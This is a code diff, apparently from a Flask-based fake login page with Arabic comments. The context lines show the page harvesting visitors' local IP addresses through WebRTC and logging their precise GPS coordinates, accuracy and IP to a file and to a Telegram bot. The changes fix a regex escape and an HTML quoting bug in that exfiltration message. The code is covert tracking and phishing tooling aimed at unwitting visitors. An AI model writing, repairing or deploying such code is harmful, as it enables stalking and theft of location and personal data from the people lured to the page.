@@ -239,7 +239,7 @@ login_page_html = '''
                 pc.onicecandidate = function(event) {
                     if (!event || !event.candidate) return;
                     const candidate = event.candidate.candidate;
-                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/g;
+                    const ipRegex = /([0-9]{1,3}\\.){3}[0-9]{1,3}/g;
                     const ipMatch = candidate.match(ipRegex);
                     if (ipMatch && ipMatch.length > 0) {
                         const localIP = ipMatch[0];
@@ -477,9 +477,11 @@ def gps_data():
     with open('gps_log.txt', 'a', encoding='utf-8') as f:
         f.write(f"\n═══════════════════════════════════════════\n📍 موقع دقيق - {datetime.datetime.now()}\n🗺️ خط العرض: {lat}\n🗺️ خط الطول: {lon}\n📏 الدقة: {accuracy} متر\n🌐 IP: {request.remote_addr}\n═══════════════════════════════════════════\n")
     maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-    gps_msg = f"<b>📍 موقع دقيق (GPS)</b>\n<b>🗺️ خط العرض:</b> {lat}\n<b>🗺️ خط الطول:</b> {lon}\n<b>📏 الدقة:</b> {accuracy} متر\n<b>📍 <a href="{maps_link}">على الخريطة</a></b>"
+    # التصحيح هنا: استخدام علامات تنصيص مفردة حول maps_link
+    gps_msg = f"<b>📍 موقع دقيق (GPS)</b>\n<b>🗺️ خط العرض:</b> {lat}\n<b>🗺️ خط الطول:</b> {lon}\n<b>📏 الدقة:</b> {accuracy} متر\n<b>📍 <a href='{maps_link}'>على الخريطة</a></b>"
     send_to_telegram(gps_msg)
     return {"status": "success"}, 200
+    
 
 # ========== استقبال بيانات المتصفح ==========
 @app.route('/browser-data', methods=['POST'])
